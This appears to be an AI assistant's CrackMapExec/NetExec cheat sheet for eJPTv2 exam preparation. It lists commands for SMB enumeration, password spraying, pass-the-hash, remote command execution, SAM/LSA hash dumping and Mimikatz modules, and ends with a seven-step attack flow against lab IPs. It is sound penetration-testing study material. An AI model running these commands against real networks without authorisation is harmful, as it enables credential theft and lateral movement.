
# CrackMapExec (CME) for eJPTv2 Prep

Great choice for eJPTv2 — CME is a post-exploitation/network assessment tool heavily tested on that cert. Here's a structured breakdown:

---

## What is CrackMapExec?

CrackMapExec (now often called **NetExec/nxc** as the maintained fork) is a Swiss Army knife for pentesting Windows/Active Directory environments. It automates tasks over **SMB, WinRM, MSSQL, SSH, RDP**, and more.

> **Note:** The original `crackmapexec`/`cme` has been superseded by `netexec` (`nxc`). For eJPTv2, both work — commands are nearly identical.

---

## Installation

```bash
# Kali Linux (pre-installed usually)
sudo apt install crackmapexec

# Or install NetExec (recommended fork)
sudo apt install netexec
pipx install netexec
```

---

## Core Syntax

```
cme <protocol> <target(s)> [options]
nxc <protocol> <target(s)> [options]   # NetExec equivalent
```

**Protocols:** `smb`, `winrm`, `ssh`, `mssql`, `rdp`, `ftp`

---

## SMB — The Most Important Protocol

### 1. Host Discovery & Enumeration

```bash
# Scan a subnet - find Windows hosts
cme smb 192.168.1.0/24

# Get OS info, hostname, signing status
cme smb 192.168.1.10
```

Output tells you: hostname, OS, domain, **SMB signing** (critical for relay attacks).

### 2. Null Session / Anonymous Enumeration

```bash
# Try null session
cme smb 192.168.1.10 -u '' -p ''

# Anonymous share listing
cme smb 192.168.1.10 -u '' -p '' --shares
```

### 3. Credential Validation (Password Spraying)

```bash
# Single user/pass
cme smb 192.168.1.10 -u administrator -p 'Password123'

# User list against one password (spray)
cme smb 192.168.1.0/24 -u users.txt -p 'Winter2024!' --continue-on-success

# Multiple users + passwords
cme smb 192.168.1.10 -u users.txt -p passwords.txt
```

✅ **`[+]`** = valid creds | ❌ **`[-]`** = invalid | 👑 **`(Pwn3d!)`** = admin access

### 4. Pass-the-Hash (PTH)

```bash
# Use NTLM hash instead of password
cme smb 192.168.1.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1244a3f489a2f1c3980'

# Just the NT hash works too
cme smb 192.168.1.10 -u administrator -H '8f81ee5558e2d1244a3f489a2f1c3980'
```

---

## Enumeration Modules

```bash
# List shares
cme smb 192.168.1.10 -u user -p pass --shares

# List logged-on users
cme smb 192.168.1.10 -u user -p pass --loggedon-users

# List local users
cme smb 192.168.1.10 -u user -p pass --local-users

# List domain users
cme smb 192.168.1.10 -u user -p pass --users

# List groups
cme smb 192.168.1.10 -u user -p pass --groups

# Dump password policy
cme smb 192.168.1.10 -u user -p pass --pass-pol
```

---

## Remote Code Execution

```bash
# Execute a command (requires admin)
cme smb 192.168.1.10 -u admin -p pass -x "whoami"
cme smb 192.168.1.10 -u admin -p pass -x "ipconfig /all"

# PowerShell command
cme smb 192.168.1.10 -u admin -p pass -X "Get-Process"
```

---

## Dumping Credentials

```bash
# Dump SAM (local hashes)
cme smb 192.168.1.10 -u admin -p pass --sam

# Dump LSA secrets
cme smb 192.168.1.10 -u admin -p pass --lsa

# Run secretsdump via module
cme smb 192.168.1.10 -u admin -p pass -M secretsdump
```

---

## WinRM (for lateral movement)

```bash
# Check WinRM access (port 5985)
cme winrm 192.168.1.10 -u user -p pass

# Execute command over WinRM
cme winrm 192.168.1.10 -u user -p pass -x "whoami"
```

If you get `(Pwn3d!)` on WinRM → use **Evil-WinRM** for a full shell.

---

## Useful Modules

```bash
# List available modules
cme smb -L

# BloodHound data collection
cme smb 192.168.1.10 -u user -p pass -M bloodhound

# Mimikatz
cme smb 192.168.1.10 -u admin -p pass -M mimikatz

# Check for MS17-010 (EternalBlue)
cme smb 192.168.1.10 -M ms17-010

# Spider shares for files
cme smb 192.168.1.10 -u user -p pass -M spider_plus
```

---

## eJPTv2 Cheat Sheet Flow

```
1. cme smb <subnet>/24              ← discover hosts
2. cme smb <ip> -u '' -p ''         ← try null session
3. cme smb <ip> -u user -p pass     ← validate creds
4. cme smb <ip> -u user -p pass --shares --users  ← enumerate
5. cme smb <ip> -u admin -p pass -x "whoami"      ← RCE
6. cme smb <ip> -u admin -p pass --sam            ← dump hashes
7. cme smb <ip> -u admin -H <hash>                ← pass-the-hash
```

---

## Obsidian Note Tips

Suggested structure for your vault:

```
📁 eJPTv2/
  📁 Tools/
    📄 CrackMapExec.md   ← this content
  📁 Techniques/
    📄 SMB-Enumeration.md
    📄 Pass-the-Hash.md
    📄 Credential-Spraying.md
```

Tag your notes: `#tool/cme`, `#protocol/smb`, `#technique/lateral-movement`

---

Want me to go deeper on any specific area — like **Active Directory enumeration**, **password spraying methodology**, or how CME fits into a full **eJPTv2 attack chain**?
